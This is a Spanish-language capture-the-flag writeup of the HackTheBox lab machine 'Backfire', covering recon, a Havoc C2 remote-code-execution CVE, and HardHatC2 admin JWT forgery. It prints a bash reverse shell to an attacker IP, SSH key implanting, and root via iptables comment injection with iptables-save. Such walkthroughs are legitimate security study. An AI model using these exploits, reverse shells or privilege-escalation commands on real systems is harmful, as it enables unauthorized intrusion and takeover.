---
layout: post
title:  "Writeup Backfire"
date:   2025-06-07
categories: [Writeup, HackTheBox]
tags: linux
image: 
    path: /images/writeup-backfire/Pasted image 20250512070449.png
---


***Dificultad: Media***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
Aquí estamos de nuevo, así que vamos a darle

lo primero, como en todas las maquinas es crear nuestros 3 directorios de trabajo en la carpeta que usare para este reporte:
```bash
mkdir nmap exploits content && cd nmap 
```
## Reconocimiento: 

teniendo esto, hare el primer escaneo de reconocimiento con nmap a la ip, sin descubrimiento de host, sin SYN, sin resolución dns, etc:
```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000  10.10.10.10 -oN puertos
```

reporta:
```
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
```


ahora, quiero ver los servicios que estan corriendo en esos puertos, vamos a escanearlos y lanzar los scripts básicos de reconocimiento que tiene nmap:
```bash
nmap -p22,443,8000 -sCV -vv -n 10.10.10.10 -oN objetivos
```

reporta:
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuxaL9aCVxiQGLRxQPezW3dkgouskvb/BcBJR16VYjHElq7F8C2ByzUTNr0OMeiwft8X5vJaD9GBqoEul4D1QE=
|   256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2oT7Hn4aUiSdg4vO9rJIbVSVKcOVKozd838ZStpwj8
443/tcp  open  ssl/http syn-ack ttl 63 nginx 1.22.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Cloud Co/stateOrProvinceName=Connecticut/countryName=US/postalCode=2423/localityName=New Haven/streetAddress=
| Subject Alternative Name: IP Address:127.0.0.1
| Issuer: commonName=127.0.0.1/organizationName=Cloud Co/stateOrProvinceName=Connecticut/countryName=US/postalCode=2423/localityName=New Haven/streetAddress=
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-12T05:33:36
| Not valid after:  2027-09-12T05:33:36
| MD5:   60cf:4102:0d11:2181:2b5a:6d11:25bb:856c
| SHA-1: 35f0:0e10:2578:5c46:8664:3462:e92f:4508:a61f:1514
| -----BEGIN CERTIFICATE-----
| MIID7DCCAtSgAwIBAgIQXWhVk2zayFCHv9WM3q2mbTANBgkqhkiG9w0BAQsFADB4

//aqui reporta un certificado ssl

| Lx4d95TeqqS3U+kslW2BKC6wwgL/nVbthXP/gcrFo0Xl5cdPTPXgqacG5yAPZRtj
|_-----END CERTIFICATE-----
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 404 Not Found
8000/tcp open  http     syn-ack ttl 63 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 12:31  disable_tls.patch
| 875   17-Dec-2024 12:34  havoc.yaotl
|_
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Index of /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

tenemos cosas interesantes, el clásico ssh, una pagina https - un puerto 80 que al parecer tiene un directory listing con 2 archivos pero servidos con http

no hay nombre de dominio, al parecer no hay contenido, de momento no voy a hacer fuzzing, quiero ver primero la pagina en el puerto 443, y los archivos del puerto 8000

443:
<img src="/images/writeup-backfire/Pasted image 20250512075016.png" alt="image">
no muestra contenido, podría intentar hacerle fuzzing

el fuzzing no ha funcionado, al parecer por el nombre de dominio

8000:

<img src="/images/writeup-backfire/Pasted image 20250512075442.png" alt="image">
/
disable_tls.patch y havoc.yaotl

descargándolos a mi maquina, tenemos:

disable_tls.patch
```script
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
                }
 
                // start the teamserver
-               if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+               if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
                        logger.Error("Failed to start websocket: " + err.Error())
                }
 

```


y havoc.yaotl:
```script
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}

```


en el segundo tenemos credenciales, un hostname y parece un archivo de configuración 

investigando que es havoc:
https://havocframework.com/docs/welcome

es un framework de comand and control para post explotación, así como metasploit o como cobalt strike

entonces estos son archivos de configuración para este framework

aun con el nombre de host, no tengo acceso al contenido en el puerto 443, lo mas probable es que sea un listener

además al parecer el teamserver esta configurado desde un localhost y nmap no reporto ese puerto como abierto

bueno, investigando un poco en el primer archivo vemos que el tls esta desactivado y que tenemos credenciales para comunicarnos con el teamserver

hay un exploit para la ejecución remota de comandos en este framework, precisamente si se cumplen estas condiciones:
```bash
https://github.com/kit4py/CVE-2024-41570/blob/main/exploit.py
```

el cual nos dice los pasos que debemos seguir para epxlotar esta vulnerabilidad

## CVE-2024-41570: 

todo inicia al intentar registrar un agente en un enpoint del teamserver para poder interactuar con el sistema, crea una conexion websocket luego le solicita al servidor abrir una conexion tcp hacia nuestra ip de atacante con un handshake, nos autentica ante el servidor (alli que nos pide las credenciales encontradas ) y luego inyecta el comando malicioso

para ejecutarlo:
```bash
python3 -m venv 3vilsec
source 3vilsec/bin/activate
git clone https://github.com/kit4py/CVE-2024-41570/blob/main/exploit.py
cd CVE*
pip install -r requirements.txt
```

vamos a instalar y ejecutar esto en un entorno python, ahora, en otra terminal, tendremos nuestro nc en ecucha:
```bash
nc -lnvp 4443
```

y en el entorno se ejecuta:
```bash
python3 exploit.py -t https://backfire.htb -i 127.0.0.1 -p 40056 -U ilya -P CobaltStr1keSuckz! -l 10.10.14.193 -L 4443
```

nos dara una reverse shell como ilya:
<img src="/images/writeup-backfire/Pasted image 20250512095310.png" alt="image">

la cual en poco tiempo se va a cerrar (habrá algún script que detecte esto y nos complique la terminal) pero si vamos rápido a su /home veremos la flag del usuario:

<img src="/images/writeup-backfire/Pasted image 20250512095449.png" alt="image">

tambien tiene un directorio .ssh el cual no tiene una id rsa, pero si un authorized_keys, así que vamos a meter alli la key de nuestra maquina para que podamos conectarnos como ese usuario sin necesidad de contraseña


busca tu clave publica en tu /home/user/.ssh si no tienes, puedes crear un par con:
```bash
ssh-keygen -t rsa -b 4095
```

armare el comando, ya que solo tenemos unos segundos:
```bash
echo 'ssh.....user@user' > /home/ilya/.ssh/autrized_keys
```

ahora, ganando la revershell de nuevo, y ejecutando este comando, podemos conectarnos como ilya sin contraseña:

<img src="/images/writeup-backfire/Pasted image 20250512100422.png" alt="image">


## Movimiento Lateral

en el mismo directorio home, hay otro archivo .txt:
<img src="/images/writeup-backfire/Pasted image 20250512100727.png" alt="image">
***Sergej dice que ha instalado HardHatC2 para probar y que no ha echo ningún cambio de los defaults, espero que el prefiera havoc porque no quiero aprender otro framework de c2, tambien Go > C#***

bastante raro, pero vamos a tomarlo como pista y mirando lo que dice, mas una pequeña búsqueda, vemos que es lo mismo que havoc, pero se nos dice que no ha cambiado los valores por defecto, supongo que contraseñas y demás

repositorio de hardhatc2: https://github.com/DragoQCC/CrucibleC2

el puerto por defecto de hardhatc2 es el puerto 5000, para validar podemos lanzar una cadena vacía al /dev/null del localhost y el puerto:
```bash
echo "" > /dev/tcp/127.0.0.1/5000
```

si el puerto esta abierto no mostrara mensaje de error

si queremos asegurarnos aun mas, podemos usar *ss* o *netstat*
```bash
ss -lte
netstat
```

el mejor resultado nos lo da *ss*:
```
State            Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port          Process                                                                           
LISTEN           0                511                              0.0.0.0:8000                           0.0.0.0:*              ino:21116 sk:1 cgroup:/system.slice/nginx.service <->                            
LISTEN           0                4096                           127.0.0.1:40056                          0.0.0.0:*              uid:1000 ino:72973 sk:2 cgroup:/system.slice/havoc.service <->                   
LISTEN           0                512                              0.0.0.0:5000                           0.0.0.0:*              uid:1001 ino:70448 sk:3 cgroup:/system.slice/hardhat_server.service <->          
LISTEN           0                512                              0.0.0.0:7096                           0.0.0.0:*              uid:1001 ino:71391 sk:4 cgroup:/system.slice/hardhat_client.service <->          
LISTEN           0                511                              0.0.0.0:https                          0.0.0.0:*              ino:21115 sk:5 cgroup:/system.slice/nginx.service <->                            
LISTEN           0                128                              0.0.0.0:ssh                            0.0.0.0:*              ino:21134 sk:6 cgroup:/system.slice/ssh.service <->                              
LISTEN           0                4096                           127.0.0.1:8443                           0.0.0.0:*              uid:1000 ino:72976 sk:7 cgroup:/system.slice/havoc.service <->                   
LISTEN           0                128                                 [::]:ssh                               [::]:*              ino:21145 sk:8 cgroup:/system.slice/ssh.service v6only:1 <->     
```

si te fijas, nos dice que exactamente hardhat esta corriendo en el puerto 5000 con la interface de usuario en 7096

vamos a traernos el puerto a nuestra maquina local, para intentar enumerar 

haremos port fordwarding con ssh (es una técnica que se ve mucho últimamente en hack the box) al puerto que tiene la interface para usuario segun el github y pudimos confirmar con *ss*, asi que vamos a traernos ambos
```bash
sh -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096 ilya@10.129.227.115
```

en el navegador:
<img src="/images/writeup-backfire/Pasted image 20250512104513.png" alt="image">

parece que hay un problema el cual no acepta parámetros o credenciales, investigando, veo que hay una vulnerabilidad para bypass el login de este framework

y encontre un articulo interesante que explica 3 vulnerabilidades sobre este mismo, 

la que nos interesa es la 2 y la 3, (ahora tiene sentido que no aceptara las creds)

crear un usuario a base del jwt que se crea primero al correr este framework

el exploit:
```python
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "3vilsec",
  "role": "TeamLead",
  "username": "3vilsec"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```


:D
<img src="/images/writeup-backfire/Pasted image 20250512115044.png" alt="image">

ahora, para ejecutar comandos el articulo nos dice que debemos ir a la pestana implantinteract:

y buscar la terminal:

<img src="/images/writeup-backfire/Pasted image 20250512115554.png" alt="image">

para escribir comandos, usamos la parte de abajo de la pestana 

vamos a devolvernos una revshell a nuestra maquina con esto:
```bash
bash -i >& /dev/tcp/10.10.14.193/4445 0>&1
```
y estaremos en escucha:
```bash
nc -lnvp 4445
```

<img src="/images/writeup-backfire/Pasted image 20250512120015.png" alt="image">

tenemos nuestra revshell como el otro usuario *sergej*

mirando su carpeta ssh, tampoco tiene id_rsa, asi que podemos hacer el mismo procedimiento anterior, colocarnos en sus authorized_keys:
```bash
echo 's...................0' > /home/sergej/.ssh/authorized_keys
```

y desde otra terminal:

<img src="/images/writeup-backfire/Pasted image 20250512121550.png" alt="image">

enumerando el sistema, vemos que tenemos la opcion de ejecutar iptables e iptables-save como root

<img src="/images/writeup-backfire/Pasted image 20250512124604.png" alt="image">

buscando modos de escalar privilegios con esto, encontré un articulo interesante:
https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

habla sobre, como podemos manipular el comando para que muestre lineas aleatorias, y junto con iptables-save como podemos sobre escribir archivos

al intentar sobreescribir el /etc/hosts como mencionan, no se puede asi que, podemos hacer lo mismo que hemos estado haciendo durante toda la maquina, inyectar nuestra authorized_keys en el directorio de root


primero vamos a escribir el iptables con:
```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'3vilsec\nss..................a0\n'
```

para verificar que el comando funciona:
```bash
sudo iptables -S
```
debe mostrarte:
```
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "3vilsec
s..................................................a0 <------esta es la key pero la he quitado
" -j ACCEPT
```

luego vamos a sobreescribir con:
```bash
sudo iptables-save -f /root/.ssh/authorized_keys
```

y desde nuestra maquina local nos conectaremos:
<img src="/images/writeup-backfire/Pasted image 20250512125324.png" alt="image">

------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">